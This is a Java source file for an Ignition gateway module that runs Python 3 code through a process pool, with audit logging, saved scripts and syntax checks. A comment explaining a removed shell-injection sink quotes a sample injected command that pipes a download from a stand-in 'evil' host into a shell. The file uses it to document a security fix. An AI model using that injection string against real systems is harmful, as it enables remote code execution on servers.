package com.inductiveautomation.ignition.examples.python3.gateway;

import com.inductiveautomation.ignition.examples.python3.Python3RpcFunctions;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.time.Instant;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;

/**
 * Gateway implementation of Python 3 scripting functions.
 * Executes Python code directly via the process pool.
 * Also implements RPC interface so Designer/Client can call these functions remotely.
 */
public class Python3ScriptModule implements Python3RpcFunctions {

    private static final Logger logger = LoggerFactory.getLogger(Python3ScriptModule.class);
    private final GatewayHook gatewayHook;

    public Python3ScriptModule(GatewayHook gatewayHook) {
        this.gatewayHook = gatewayHook;
        logger.info("Python3ScriptModule created");
    }

    /**
     * Lazily get the default process pool from the gateway hook.
     * This allows the script module to be registered before the pool is initialized.
     * Made public in v2.14.0 Phase 2 Week 3-4 for REST API monitoring endpoints.
     */
    public Python3ProcessPool getProcessPool() {
        return gatewayHook.getProcessPool();
    }

    /**
     * Get the pool manager for multi-version access (v3.1.0).
     */
    public PoolManager getPoolManager() {
        return gatewayHook.getPoolManager();
    }

    /**
     * Get a process pool for a specific Python version (v3.1.0).
     *
     * @param pythonVersion the desired Python version (e.g., "3.11"), null for default
     * @return the pool for that version
     * @throws RuntimeException if version is not available
     */
    public Python3ProcessPool getPoolForVersion(String pythonVersion) {
        PoolManager manager = getPoolManager();
        if (manager == null) {
            // Fallback: no pool manager, return default
            return getProcessPool();
        }
        try {
            return manager.getPool(pythonVersion);
        } catch (PoolManager.VersionNotAvailableException e) {
            throw new RuntimeException(e.getMessage(), e);
        }
    }

    /**
     * Get list of available Python versions (v3.1.0).
     *
     * @return list of version strings, or empty list if pool manager not initialized
     */
    public List<String> getAvailableVersions() {
        PoolManager manager = getPoolManager();
        if (manager == null) {
            return Collections.emptyList();
        }
        return manager.getAvailableVersions();
    }

    /**
     * Get the default Python version (v3.1.0).
     *
     * @return default version string, or null if pool manager not initialized
     */
    public String getDefaultVersion() {
        PoolManager manager = getPoolManager();
        return manager != null ? manager.getDefaultVersion() : null;
    }

    /**
     * Lazily get the distribution manager from the gateway hook.
     */
    private PythonDistributionManager getDistributionManager() {
        return gatewayHook.getDistributionManager();
    }

    /**
     * Lazily get the script repository from the gateway hook.
     */
    private Python3ScriptRepository getScriptRepository() {
        return gatewayHook.getScriptRepository();
    }

    /**
     * Lazily get the audit logger from the gateway hook (v2.6.0).
     */
    private Python3AuditLogger getAuditLogger() {
        return gatewayHook.getAuditLogger();
    }

    /**
     * Execute Python 3 code and return the result.
     *
     * @param code Python code to execute
     * @return Result of execution
     */
    public Object exec(String code) throws Exception {
        return exec(code, Collections.emptyMap());
    }

    /**
     * Execute Python 3 code with variables and return the result.
     *
     * @param code      Python code to execute
     * @param variables Dictionary of variables to pass to Python
     * @return Result of execution
     */
    @Override
    public Object exec(String code, Map<String, Object> variables) throws Exception {
        return exec(code, variables, "RESTRICTED");
    }

    /**
     * Execute Python 3 code with a specific Python version (v3.1.0).
     *
     * @param code          Python code to execute
     * @param variables     Dictionary of variables to pass to Python
     * @param securityMode  Security mode: "RESTRICTED" or "ADMIN"
     * @param pythonVersion Python version to use (e.g., "3.11"), null for default
     * @return Result of execution
     */
    public Object exec(String code, Map<String, Object> variables, String securityMode, String pythonVersion) throws Exception {
        return execWithVersion(code, variables, securityMode, pythonVersion);
    }

    /**
     * Execute Python 3 code with variables and security mode.
     *
     * @param code         Python code to execute
     * @param variables    Dictionary of variables to pass to Python
     * @param securityMode Security mode: "RESTRICTED" or "ADMIN"
     * @return Result of execution
     */
    public Object exec(String code, Map<String, Object> variables, String securityMode) throws Exception {
        // Defensive null checks
        if (code == null) {
            throw new IllegalArgumentException("code parameter cannot be null");
        }
        if (variables == null) {
            variables = Collections.emptyMap();
        }
        if (securityMode == null) {
            securityMode = "RESTRICTED";
        }

        logger.debug("exec() called with code length: {}, security mode: {}",
                    code.length(), securityMode);

        // Audit logging (v2.6.0)
        Instant startTime = Instant.now();
        String codeHash = Python3SecurityUtils.hashCode(code);
        SecurityMode mode = SecurityMode.fromString(securityMode);
        boolean success = false;
        String errorMessage = null;

        try {
            Python3ProcessPool pool = getProcessPool();
            if (pool == null) {
                String errorMsg = "Python 3 process pool is not initialized. Check Gateway logs for initialization errors.";
                logger.error(errorMsg);
                errorMessage = errorMsg;
                throw new RuntimeException(errorMsg);
            }

            logger.debug("Executing Python code via process pool");
            Python3Result result = pool.execute(code, variables != null ? variables : Collections.emptyMap(), securityMode);

            if (result.isSuccess()) {
                logger.debug("Python code executed successfully");
                success = true;
                return result.getResult();
            } else {
                String errorMsg = "Python error: " + result.getError();
                if (result.getTraceback() != null) {
                    errorMsg += "\n" + result.getTraceback();
                }
                logger.error(errorMsg);
                errorMessage = result.getError(); // Store original error for audit
                throw new RuntimeException(errorMsg);
            }

        } catch (Python3Exception e) {
            logger.error("Failed to execute Python code", e);
            errorMessage = e.getMessage();
            throw new RuntimeException("Failed to execute Python code: " + e.getMessage(), e);
        } finally {
            // Always log audit event (success or failure)
            long durationMs = java.time.Duration.between(startTime, Instant.now()).toMillis();
            Python3AuditLogger auditLogger = getAuditLogger();
            if (auditLogger != null) {
                Python3AuditEvent event = new Python3AuditEvent(
                    startTime,
                    Python3SecurityUtils.getCurrentUser(),
                    Python3SecurityUtils.getSourceIP(),
                    mode,
                    codeHash,
                    success,
                    durationMs,
                    errorMessage,
                    Python3SecurityUtils.getEndpoint("SCRIPT", "system.python3.exec")
                );
                auditLogger.logExecution(event);
            }
        }
    }

    /**
     * Execute Python 3 code with a specific version (v3.1.0 internal).
     * Routes to the correct pool based on pythonVersion.
     */
    private Object execWithVersion(String code, Map<String, Object> variables,
                                   String securityMode, String pythonVersion) throws Exception {
        if (code == null) {
            throw new IllegalArgumentException("code parameter cannot be null");
        }
        if (variables == null) {
            variables = Collections.emptyMap();
        }
        if (securityMode == null) {
            securityMode = "RESTRICTED";
        }

        logger.debug("execWithVersion() called: version={}, code length: {}", pythonVersion, code.length());

        Instant startTime = Instant.now();
        String codeHash = Python3SecurityUtils.hashCode(code);
        SecurityMode mode = SecurityMode.fromString(securityMode);
        boolean success = false;
        String errorMessage = null;

        try {
            Python3ProcessPool pool = getPoolForVersion(pythonVersion);
            if (pool == null) {
                String errorMsg = "Python 3 process pool is not initialized for version: " + pythonVersion;
                logger.error(errorMsg);
                errorMessage = errorMsg;
                throw new RuntimeException(errorMsg);
            }

            Python3Result result = pool.execute(code, variables, securityMode);

            if (result.isSuccess()) {
                success = true;
                return result.getResult();
            } else {
                String errorMsg = "Python error: " + result.getError();
                if (result.getTraceback() != null) {
                    errorMsg += "\n" + result.getTraceback();
                }
                errorMessage = result.getError();
                throw new RuntimeException(errorMsg);
            }
        } catch (Python3Exception e) {
            errorMessage = e.getMessage();
            throw new RuntimeException("Failed to execute Python code: " + e.getMessage(), e);
        } finally {
            long durationMs = java.time.Duration.between(startTime, Instant.now()).toMillis();
            Python3AuditLogger auditLogger = getAuditLogger();
            if (auditLogger != null) {
                Python3AuditEvent event = new Python3AuditEvent(
                    startTime,
                    Python3SecurityUtils.getCurrentUser(),
                    Python3SecurityUtils.getSourceIP(),
                    mode, codeHash, success, durationMs, errorMessage,
                    Python3SecurityUtils.getEndpoint("SCRIPT", "system.python3.exec")
                );
                auditLogger.logExecution(event);
            }
        }
    }

    /**
     * Evaluate a Python 3 expression and return the result.
     *
     * @param expression Python expression to evaluate
     * @return Result of expression
     */
    public Object eval(String expression) throws Exception {
        return eval(expression, Collections.emptyMap());
    }

    /**
     * Evaluate a Python 3 expression with variables and return the result.
     *
     * @param expression Python expression to evaluate
     * @param variables  Dictionary of variables to pass to Python
     * @return Result of expression
     */
    @Override
    public Object eval(String expression, Map<String, Object> variables) throws Exception {
        return eval(expression, variables, "RESTRICTED");
    }

    /**
     * Evaluate a Python 3 expression with version selection (v3.1.0).
     *
     * @param expression    Python expression to evaluate
     * @param variables     Dictionary of variables to pass to Python
     * @param securityMode  Security mode: "RESTRICTED" or "ADMIN"
     * @param pythonVersion Python version to use (e.g., "3.11"), null for default
     * @return Result of expression
     */
    public Object eval(String expression, Map<String, Object> variables, String securityMode, String pythonVersion) throws Exception {
        return evalWithVersion(expression, variables, securityMode, pythonVersion);
    }

    /**
     * Evaluate a Python 3 expression with variables and security mode.
     *
     * @param expression   Python expression to evaluate
     * @param variables    Dictionary of variables to pass to Python
     * @param securityMode Security mode: "RESTRICTED" or "ADMIN"
     * @return Result of expression
     */
    public Object eval(String expression, Map<String, Object> variables, String securityMode) throws Exception {
        // Defensive null checks
        if (expression == null) {
            throw new IllegalArgumentException("expression parameter cannot be null");
        }
        if (variables == null) {
            variables = Collections.emptyMap();
        }
        if (securityMode == null) {
            securityMode = "RESTRICTED";
        }

        logger.debug("eval() called with expression: {}, security mode: {}", expression, securityMode);

        // Audit logging (v2.6.0)
        Instant startTime = Instant.now();
        String codeHash = Python3SecurityUtils.hashCode(expression);
        SecurityMode mode = SecurityMode.fromString(securityMode);
        boolean success = false;
        String errorMessage = null;

        try {
            Python3ProcessPool pool = getProcessPool();
            if (pool == null) {
                String errorMsg = "Python 3 process pool is not initialized. Check Gateway logs for initialization errors.";
                logger.error(errorMsg);
                errorMessage = errorMsg;
                throw new RuntimeException(errorMsg);
            }

            logger.debug("Evaluating Python expression via process pool");
            Python3Result result = pool.evaluate(expression, variables != null ? variables : Collections.emptyMap(), securityMode);

            if (result.isSuccess()) {
                logger.debug("Python expression evaluated successfully");
                success = true;
                return result.getResult();
            } else {
                String errorMsg = "Python error: " + result.getError();
                if (result.getTraceback() != null) {
                    errorMsg += "\n" + result.getTraceback();
                }
                logger.error(errorMsg);
                errorMessage = result.getError(); // Store original error for audit
                throw new RuntimeException(errorMsg);
            }

        } catch (Python3Exception e) {
            logger.error("Failed to evaluate Python expression", e);
            errorMessage = e.getMessage();
            throw new RuntimeException("Failed to evaluate Python expression: " + e.getMessage(), e);
        } finally {
            // Always log audit event (success or failure)
            long durationMs = java.time.Duration.between(startTime, Instant.now()).toMillis();
            Python3AuditLogger auditLogger = getAuditLogger();
            if (auditLogger != null) {
                Python3AuditEvent event = new Python3AuditEvent(
                    startTime,
                    Python3SecurityUtils.getCurrentUser(),
                    Python3SecurityUtils.getSourceIP(),
                    mode,
                    codeHash,
                    success,
                    durationMs,
                    errorMessage,
                    Python3SecurityUtils.getEndpoint("SCRIPT", "system.python3.eval")
                );
                auditLogger.logExecution(event);
            }
        }
    }

    /**
     * Evaluate a Python 3 expression with a specific version (v3.1.0 internal).
     */
    private Object evalWithVersion(String expression, Map<String, Object> variables,
                                   String securityMode, String pythonVersion) throws Exception {
        if (expression == null) {
            throw new IllegalArgumentException("expression parameter cannot be null");
        }
        if (variables == null) {
            variables = Collections.emptyMap();
        }
        if (securityMode == null) {
            securityMode = "RESTRICTED";
        }

        logger.debug("evalWithVersion() called: version={}, expression: {}", pythonVersion, expression);

        Instant startTime = Instant.now();
        String codeHash = Python3SecurityUtils.hashCode(expression);
        SecurityMode mode = SecurityMode.fromString(securityMode);
        boolean success = false;
        String errorMessage = null;

        try {
            Python3ProcessPool pool = getPoolForVersion(pythonVersion);
            if (pool == null) {
                String errorMsg = "Python 3 process pool is not initialized for version: " + pythonVersion;
                errorMessage = errorMsg;
                throw new RuntimeException(errorMsg);
            }

            Python3Result result = pool.evaluate(expression, variables, securityMode);

            if (result.isSuccess()) {
                success = true;
                return result.getResult();
            } else {
                String errorMsg = "Python error: " + result.getError();
                if (result.getTraceback() != null) {
                    errorMsg += "\n" + result.getTraceback();
                }
                errorMessage = result.getError();
                throw new RuntimeException(errorMsg);
            }
        } catch (Python3Exception e) {
            errorMessage = e.getMessage();
            throw new RuntimeException("Failed to evaluate Python expression: " + e.getMessage(), e);
        } finally {
            long durationMs = java.time.Duration.between(startTime, Instant.now()).toMillis();
            Python3AuditLogger auditLogger = getAuditLogger();
            if (auditLogger != null) {
                Python3AuditEvent event = new Python3AuditEvent(
                    startTime,
                    Python3SecurityUtils.getCurrentUser(),
                    Python3SecurityUtils.getSourceIP(),
                    mode, codeHash, success, durationMs, errorMessage,
                    Python3SecurityUtils.getEndpoint("SCRIPT", "system.python3.eval")
                );
                auditLogger.logExecution(event);
            }
        }
    }

    /**
     * Call a function from a Python 3 module.
     *
     * @param moduleName   Module name (e.g., "math")
     * @param functionName Function name (e.g., "sqrt")
     * @param args         List of positional arguments
     * @return Result of function call
     */
    @Override
    public Object callModule(String moduleName, String functionName, List<Object> args) throws Exception {
        return callModule(moduleName, functionName, args, Collections.emptyMap());
    }

    /**
     * Call a function from a Python 3 module with keyword arguments.
     *
     * @param moduleName   Module name (e.g., "math")
     * @param functionName Function name (e.g., "sqrt")
     * @param args         List of positional arguments
     * @param kwargs       Dictionary of keyword arguments
     * @return Result of function call
     */
    public Object callModule(String moduleName, String functionName, List<Object> args, Map<String, Object> kwargs) {
        return callModule(moduleName, functionName, args, kwargs, "RESTRICTED");
    }

    /**
     * Call a function from a Python 3 module with keyword arguments and security mode.
     *
     * @param moduleName   Module name (e.g., "math")
     * @param functionName Function name (e.g., "sqrt")
     * @param args         List of positional arguments
     * @param kwargs       Dictionary of keyword arguments
     * @param securityMode Security mode: "RESTRICTED" or "ADMIN"
     * @return Result of function call
     */
    public Object callModule(String moduleName, String functionName, List<Object> args, Map<String, Object> kwargs, String securityMode) {
        logger.debug("callModule() called: {}.{}(), security mode: {}", moduleName, functionName, securityMode);

        try {
            Python3ProcessPool pool = getProcessPool();
            if (pool == null) {
                String errorMsg = "Python 3 process pool is not initialized. Check Gateway logs for initialization errors.";
                logger.error(errorMsg);
                throw new RuntimeException(errorMsg);
            }

            logger.debug("Calling Python module function via process pool");
            Python3Result result = pool.callModule(
                moduleName,
                functionName,
                args != null ? args : Collections.emptyList(),
                kwargs != null ? kwargs : Collections.emptyMap(),
                securityMode
            );

            if (result.isSuccess()) {
                logger.debug("Python module function called successfully");
                return result.getResult();
            } else {
                String errorMsg = "Python error: " + result.getError();
                if (result.getTraceback() != null) {
                    errorMsg += "\n" + result.getTraceback();
                }
                logger.error(errorMsg);
                throw new RuntimeException(errorMsg);
            }

        } catch (Python3Exception e) {
            logger.error("Failed to call Python module function", e);
            throw new RuntimeException("Failed to call Python module function: " + e.getMessage(), e);
        }
    }

    // execShell() / escapeForPython() were removed in this fix-pass (security finding C16).
    //
    // Rationale: the previous implementation interpolated a user-supplied command
    // string into Python source code and executed it with `subprocess.run(<cmd>,
    // shell=True, ...)`. The naive single-quote escape (only \\, ', \n) plus
    // shell=True made it a classic shell-injection sink — submitting
    //     command="ls; curl evil | sh"
    // would run the second command as the Gateway service user.
    //
    // The corresponding Python feature was already removed from python_bridge.py
    // (v2.9.0). Removing the Java entry-point closes the Jython-side
    // `system.python3.execShell(...)` exposure as well.
    //
    // See /modules/.review/fixes/C16.md for the deprecation note.

    /**
     * Check if Python 3 is available and the process pool is healthy.
     *
     * @return true if Python 3 is available
     */
    @Override
    public boolean isAvailable() {
        Python3ProcessPool pool = getProcessPool();
        boolean available = pool != null && !pool.isShutdown();
        logger.debug("isAvailable() = {}", available);
        return available;
    }

    /**
     * Get Python 3 version information.
     *
     * @return Dictionary with version information
     */
    @Override
    public Map<String, Object> getVersion() {
        logger.debug("getVersion() called");

        try {
            Python3ProcessPool pool = getProcessPool();
            if (pool == null) {
                Map<String, Object> versionInfo = new HashMap<>();
                versionInfo.put("available", false);
                versionInfo.put("error", "Python 3 process pool is not initialized");
                logger.warn("getVersion() - pool not initialized");
                return versionInfo;
            }

            // v2.0.17: Use ADMIN mode to allow sys import (safe read-only operation)
            Python3Result result = pool.execute("import sys; result = sys.version", Collections.emptyMap(), "ADMIN");

            if (result.isSuccess()) {
                Map<String, Object> versionInfo = new HashMap<>();
                versionInfo.put("version", result.getResult());
                versionInfo.put("available", true);
                logger.debug("getVersion() successful: {}", result.getResult());
                return versionInfo;
            } else {
                Map<String, Object> versionInfo = new HashMap<>();
                versionInfo.put("available", false);
                versionInfo.put("error", result.getError());
                logger.error("getVersion() failed: {}", result.getError());
                return versionInfo;
            }

        } catch (Exception e) {
            logger.error("Failed to get Python version", e);
            Map<String, Object> versionInfo = new HashMap<>();
            versionInfo.put("available", false);
            versionInfo.put("error", e.getMessage());
            return versionInfo;
        }
    }

    /**
     * Get process pool statistics.
     *
     * @return Dictionary with pool statistics
     */
    @Override
    public Map<String, Object> getPoolStats() {
        logger.debug("getPoolStats() called");

        Python3ProcessPool pool = getProcessPool();
        if (pool == null) {
            Map<String, Object> statsMap = new HashMap<>();
            statsMap.put("error", "Python 3 process pool is not initialized");
            logger.warn("getPoolStats() - pool not initialized");
            return statsMap;
        }

        Python3ProcessPool.PoolStats stats = pool.getStats();

        Map<String, Object> statsMap = new HashMap<>();
        statsMap.put("poolSize", stats.totalSize);
        statsMap.put("available", stats.available);
        statsMap.put("inUse", stats.inUse);
        statsMap.put("healthy", stats.healthy);

        logger.debug("getPoolStats() - total: {}, available: {}, inUse: {}, healthy: {}",
            stats.totalSize, stats.available, stats.inUse, stats.healthy);

        return statsMap;
    }

    /**
     * Resize the process pool to a new size (1-20).
     *
     * @param newSize the new pool size (1-20)
     * @throws IllegalArgumentException if newSize is out of range
     * @throws IllegalStateException if pool is not initialized or shutdown
     *
     * v1.17.2: Added for dynamic pool size adjustment
     */
    public void resizePool(int newSize) {
        logger.debug("resizePool() called with newSize: {}", newSize);

        Python3ProcessPool pool = getProcessPool();
        if (pool == null) {
            String errorMsg = "Python 3 process pool is not initialized";
            logger.error(errorMsg);
            throw new IllegalStateException(errorMsg);
        }

        pool.resizePool(newSize);
        logger.info("Process pool resized to {}", newSize);
    }

    /**
     * Execute a simple Python 3 example (for testing).
     *
     * @return Example result
     */
    @Override
    public String example() throws Exception {
        logger.info("example() called - running test");

        try {
            // Test basic math
            Object result = eval("2 ** 100");
            String successMsg = "Python 3 is working! 2^100 = " + result;
            logger.info("example() successful");
            return successMsg;

        } catch (Exception e) {
            String errorMsg = "Python 3 error: " + e.getMessage();
            logger.error("example() failed: {}", errorMsg);
            return errorMsg;
        }
    }

    /**
     * Get Python distribution status and installation info.
     *
     * @return Dictionary with distribution information
     */
    @Override
    public Map<String, Object> getDistributionInfo() {
        logger.debug("getDistributionInfo() called");

        PythonDistributionManager manager = getDistributionManager();
        if (manager != null) {
            Map<String, Object> info = manager.getStatus();
            logger.debug("getDistributionInfo() returned status");
            return info;
        } else {
            Map<String, Object> info = new HashMap<>();
            info.put("available", false);
            info.put("error", "Distribution manager not initialized");
            logger.warn("getDistributionInfo() - manager not initialized");
            return info;
        }
    }

    /**
     * Call a saved Python script by path with arguments.
     * The script's 'result' variable will be returned.
     *
     * @param scriptPath Path to the script (e.g., "My Script" or "Folder/My Script")
     * @param args       Positional arguments to pass to the script
     * @param kwargs     Keyword arguments to pass to the script
     * @return The value of the 'result' variable from the script
     * @throws Exception if script not found or execution fails
     */
    @Override
    public Object callScript(String scriptPath, List<Object> args, Map<String, Object> kwargs) throws Exception {
        logger.debug("callScript() called with path: {}", scriptPath);

        try {
            // Load the script from repository
            Python3ScriptRepository repository = getScriptRepository();
            if (repository == null) {
                String errorMsg = "Script repository is not initialized";
                logger.error(errorMsg);
                throw new RuntimeException(errorMsg);
            }

            Python3ScriptRepository.SavedScript script = repository.loadScriptByPath(scriptPath);
            if (script == null) {
                String errorMsg = "Script not found: " + scriptPath;
                logger.error(errorMsg);
                throw new RuntimeException(errorMsg);
            }

            logger.debug("Loaded script: {} with code length: {}", script.getName(), script.getCode().length());

            // Prepare variables to inject into the script
            Map<String, Object> variables = new HashMap<>();
            if (args != null) {
                variables.put("args", args);
            } else {
                variables.put("args", Collections.emptyList());
            }
            if (kwargs != null) {
                variables.put("kwargs", kwargs);
            } else {
                variables.put("kwargs", Collections.emptyMap());
            }

            logger.debug("Executing script with {} args and {} kwargs",
                args != null ? args.size() : 0,
                kwargs != null ? kwargs.size() : 0);

            // Execute the script
            Python3ProcessPool pool = getProcessPool();
            if (pool == null) {
                String errorMsg = "Python 3 process pool is not initialized. Check Gateway logs for initialization errors.";
                logger.error(errorMsg);
                throw new RuntimeException(errorMsg);
            }

            Python3Result result = pool.execute(script.getCode(), variables);

            if (result.isSuccess()) {
                logger.debug("Script executed successfully");
                return result.getResult();
            } else {
                String errorMsg = "Python error in script '" + scriptPath + "': " + result.getError();
                if (result.getTraceback() != null) {
                    errorMsg += "\n" + result.getTraceback();
                }
                logger.error(errorMsg);
                throw new RuntimeException(errorMsg);
            }

        } catch (Python3Exception e) {
            logger.error("Failed to execute script: {}", scriptPath, e);
            throw new RuntimeException("Failed to execute script '" + scriptPath + "': " + e.getMessage(), e);
        }
    }

    /**
     * Call a saved Python script by path (without arguments).
     *
     * @param scriptPath Path to the script
     * @return The value of the 'result' variable from the script
     * @throws Exception if script not found or execution fails
     */
    public Object callScript(String scriptPath) throws Exception {
        return callScript(scriptPath, Collections.emptyList(), Collections.emptyMap());
    }

    /**
     * Get list of available saved scripts with metadata.
     * Useful for autocomplete helpers and script browsers.
     *
     * @return List of script metadata maps (name, description, path, author, version)
     */
    @Override
    public List<Map<String, Object>> getAvailableScripts() {
        logger.debug("getAvailableScripts() called");

        Python3ScriptRepository repository = getScriptRepository();
        if (repository == null) {
            logger.warn("getAvailableScripts() - repository not initialized");
            return Collections.emptyList();
        }

        List<Python3ScriptRepository.ScriptMetadata> scripts = repository.listScripts();

        return scripts.stream()
            .map(script -> {
                Map<String, Object> metadata = new HashMap<>();
                metadata.put("name", script.getName());
                metadata.put("description", script.getDescription() != null ? script.getDescription() : "");
                metadata.put("path", buildScriptPath(script));
                metadata.put("author", script.getAuthor() != null ? script.getAuthor() : "");
                metadata.put("version", script.getVersion() != null ? script.getVersion() : "1.0");
                metadata.put("lastModified", script.getLastModified() != null ? script.getLastModified() : "");
                return metadata;
            })
            .collect(Collectors.toList());
    }

    /**
     * Build full script path from metadata (folder/name format).
     *
     * @param script Script metadata
     * @return Full path string
     */
    private String buildScriptPath(Python3ScriptRepository.ScriptMetadata script) {
        String folder = script.getFolderPath();
        if (folder == null || folder.isEmpty()) {
            return script.getName();
        }
        return folder + "/" + script.getName();
    }

    /**
     * Check Python code for syntax errors.
     * Uses AST parser and pyflakes for validation.
     *
     * @param code Python code to check
     * @return Dictionary with "errors" list containing error details
     */
    public Map<String, Object> checkSyntax(String code) {
        logger.debug("checkSyntax() called with code length: {}", code != null ? code.length() : 0);

        try {
            Python3ProcessPool pool = getProcessPool();
            if (pool == null) {
                String errorMsg = "Python 3 process pool is not initialized";
                logger.error(errorMsg);
                Map<String, Object> result = new HashMap<>();
                result.put("errors", Collections.emptyList());
                result.put("error", errorMsg);
                return result;
            }

            // Execute syntax check via pool
            Python3Result result = pool.checkSyntax(code != null ? code : "");

            if (result.isSuccess()) {
                Object resultObj = result.getResult();

                // Result should be a Map with "errors" list
                if (resultObj instanceof Map) {
                    // Safe cast: Python bridge returns Map<String, Object> from JSON parsing
                    @SuppressWarnings("unchecked")
                    Map<String, Object> resultMap = (Map<String, Object>) resultObj;
                    logger.debug("Syntax check completed, found {} errors",
                            resultMap.containsKey("errors") && resultMap.get("errors") instanceof List
                                    ? ((List<?>) resultMap.get("errors")).size() : 0);
                    return resultMap;
                } else {
                    // Unexpected result format
                    Map<String, Object> fallback = new HashMap<>();
                    fallback.put("errors", Collections.emptyList());
                    logger.warn("Syntax check returned unexpected format: {}", resultObj);
                    return fallback;
                }
            } else {
                // Syntax check itself failed
                String errorMsg = "Syntax check failed: " + result.getError();
                logger.error(errorMsg);
                Map<String, Object> errorResult = new HashMap<>();
                errorResult.put("errors", Collections.emptyList());
                errorResult.put("error", errorMsg);
                return errorResult;
            }

        } catch (Exception e) {
            logger.error("Failed to check syntax", e);
            Map<String, Object> errorResult = new HashMap<>();
            errorResult.put("errors", Collections.emptyList());
            errorResult.put("error", e.getMessage());
            return errorResult;
        }
    }

    /**
     * Get code completions at cursor position.
     * Uses Jedi library for intelligent code completion.
     *
     * @param code   Python code
     * @param line   Line number (1-based)
     * @param column Column number (0-based)
     * @return Dictionary with "completions" list containing completion details
     */
    public Map<String, Object> getCompletions(String code, int line, int column) {
        logger.debug("getCompletions() called at line {}, column {}", line, column);

        try {
            Python3ProcessPool pool = getProcessPool();
            if (pool == null) {
                String errorMsg = "Python 3 process pool is not initialized";
                logger.error(errorMsg);
                Map<String, Object> result = new HashMap<>();
                result.put("completions", Collections.emptyList());
                result.put("error", errorMsg);
                return result;
            }

            // Execute completions request via pool
            Python3Result result = pool.getCompletions(code != null ? code : "", line, column);

            if (result.isSuccess()) {
                Object resultObj = result.getResult();

                // Result should be a Map with "completions" list
                if (resultObj instanceof Map) {
                    // Safe cast: Python bridge returns Map<String, Object> from JSON parsing
                    @SuppressWarnings("unchecked")
                    Map<String, Object> resultMap = (Map<String, Object>) resultObj;
                    logger.debug("Completions request completed, found {} completions",
                            resultMap.containsKey("completions") && resultMap.get("completions") instanceof List
                                    ? ((List<?>) resultMap.get("completions")).size() : 0);
                    return resultMap;
                } else {
                    // Unexpected result format
                    Map<String, Object> fallback = new HashMap<>();
                    fallback.put("completions", Collections.emptyList());
                    logger.warn("Completions request returned unexpected format: {}", resultObj);
                    return fallback;
                }
            } else {
                // Completions request itself failed
                String errorMsg = "Completions request failed: " + result.getError();
                logger.error(errorMsg);
                Map<String, Object> errorResult = new HashMap<>();
                errorResult.put("completions", Collections.emptyList());
                errorResult.put("error", errorMsg);
                return errorResult;
            }

        } catch (Exception e) {
            logger.error("Failed to get completions", e);
            Map<String, Object> errorResult = new HashMap<>();
            errorResult.put("completions", Collections.emptyList());
            errorResult.put("error", e.getMessage());
            return errorResult;
        }
    }
}
